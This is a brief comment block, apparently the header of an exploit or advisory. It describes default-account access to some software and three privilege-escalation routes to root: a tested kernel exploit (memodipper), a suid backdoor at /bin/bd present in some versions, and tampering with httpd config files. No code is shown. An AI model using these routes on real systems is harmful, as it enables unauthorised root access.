#Provides access to default user account, privileges can be easily elevated by using either:
# - a kernel exploit (ex. memodipper was tested and it worked)
# - by executing /bin/bd (suid backdoor present on SOME but not all versions)
# - by manipulating the httpd config files to trick the root user into executing your code (separate advisory will be released soon)
